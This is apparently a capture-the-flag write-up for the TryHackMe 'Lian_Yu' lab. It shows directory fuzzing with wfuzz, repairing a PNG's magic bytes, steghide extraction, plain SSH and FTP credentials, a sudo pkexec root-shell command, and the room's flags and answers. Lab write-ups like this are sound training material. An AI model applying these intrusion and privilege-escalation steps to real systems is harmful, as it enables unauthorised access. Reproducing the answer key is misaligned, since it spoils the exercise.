# Lian_Yu-SSH credentials expose$sudo pkexec privilege escalation

```
export IP=10.10.214.106
```

# Material needed

1. Interesting directory: /island/2100

2. FUZZing file .ticket

```
wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.10.191.240/island/2100/FUZZ.ticket

Result: green_arrow.ticket
```

3. Reverse engineering Leave_me_alone.png

```
# check hex number in head file
xxd Leave_me_alone.png | head   

# Add magic number of png
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | dd conv=notrunc of=Leave_me_alone.png bs=1
```

4. Reverse engineering aa.jpg

```
steghide --extract -sf aa.jpg 
Enter passphrase: password
```

5. SSH credentials

```
slade:M3tahuman
```

6. Privilege escalation

```
sudo /usr/bin/pkexec /bin/sh
```

# Tasks

1. What is the Web Directory you found? 2100

2. what is the file name you found? green_arrow.ticket

3. what is the FTP Password? !#th3h00d 

4. what is the file name with SSH password? shado

5. user.txt

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

6. root.txt

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```

